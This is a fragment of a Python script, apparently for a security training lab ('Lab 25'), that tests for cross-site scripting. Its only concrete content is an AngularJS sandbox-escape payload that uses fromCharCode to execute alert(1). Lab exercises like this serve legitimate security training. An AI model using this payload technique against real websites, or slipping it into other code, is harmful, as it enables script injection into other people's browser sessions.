...
def xss_test(url, use_proxy=False):
    try:
        ...
        payload = 'abc&toString().constructor.prototype.charAt%3D[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)'
...
def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 25')
